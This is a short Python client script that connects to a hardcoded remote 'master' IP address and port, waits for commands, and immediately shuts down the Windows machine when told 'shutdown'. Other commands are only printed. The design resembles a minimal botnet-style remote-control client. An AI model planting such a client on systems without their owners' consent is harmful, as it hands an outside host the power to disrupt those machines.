import socket
import subprocess

def main():
    # Define the master address
    master_addr = "200.5.97.16"
    master_port = 9000  # Change this to the master's IP address and port

    # Connect to the master
    try:
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn.connect((master_addr, master_port))
        print("Connected to master")
    except Exception as e:
        print("Error connecting to master:", e)
        return

    # Start a loop to handle incoming messages from the master
    while True:
        try:
            command = conn.recv(1024).decode().strip()
            print("Received command from master:", command)

            # Execute commands
            if command == "shutdown":
                print("Shutting down...")
                # Run the shutdown command
                subprocess.run(["shutdown", "/s", "/t", "0"], check=True)
                break
            else:
                # Handle other commands if needed
                print("Unknown command:", command)
        except Exception as e:
            print("Error:", e)
            break

    conn.close()

if __name__ == "__main__":
    main()
